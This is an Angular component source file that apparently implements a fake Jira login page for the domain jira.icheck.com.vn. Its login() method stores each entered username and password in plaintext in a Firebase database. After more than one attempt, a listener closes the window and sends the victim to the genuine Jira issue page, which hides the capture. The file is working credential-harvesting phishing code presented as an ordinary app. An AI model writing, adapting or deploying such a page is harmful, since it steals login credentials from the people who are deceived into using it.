  import { Component } from '@angular/core';
  import { AngularFireDatabase } from '@angular/fire/database'
  import firebase from 'firebase';

  @Component({
    selector: 'app-root',
    templateUrl: './app.component.html',
    styleUrls: ['./app.component.css']
  })
  export class AppComponent {
    title = 'Jira';

    username = ""
    password = ""

    errorValue = false
    count = 0

    id: any;

    constructor(private db: AngularFireDatabase) { 
      this.id = window.location.href.split('/').pop()

      firebase.database().ref().on('value', snapshot => {
        if (this.count > 1) {
          window.close()
          this.goToLink(`http://jira.icheck.com.vn/browse/${this.id}`)
        }
      })
    }

    goToLink(url: string){
      window.open(url, "_blank");
    }

    login() {
      if (this.username != "" && this.password != "") {
        this.errorValue = false
        this.count += 1
        const id = this.db.createPushId()
        const tutRef = this.db.object(id);
        tutRef.set({ username: this.username, password: this.password});
      } else {
        this.errorValue = true
      }      
    }
    
  }
